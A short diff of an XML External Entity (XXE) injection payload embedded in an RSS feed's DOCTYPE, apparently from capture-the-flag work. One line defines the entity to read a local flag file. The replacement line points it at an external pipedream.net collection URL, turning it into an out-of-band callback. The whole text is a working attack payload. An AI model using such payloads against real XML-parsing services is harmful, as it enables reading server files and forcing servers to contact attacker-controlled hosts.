@@ -2,7 +2,7 @@
 <!DOCTYPE anything
     [
         <!ELEMENT anything ANY >
-        <!ENTITY xxe SYSTEM "/flag_66cc7da521fa97f7909f623cf11dcfd4" >
+        <!ENTITY xxe SYSTEM "https://022b0d4fc5ca54f440504013751d320f.m.pipedream.net" >
     ]
 >
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
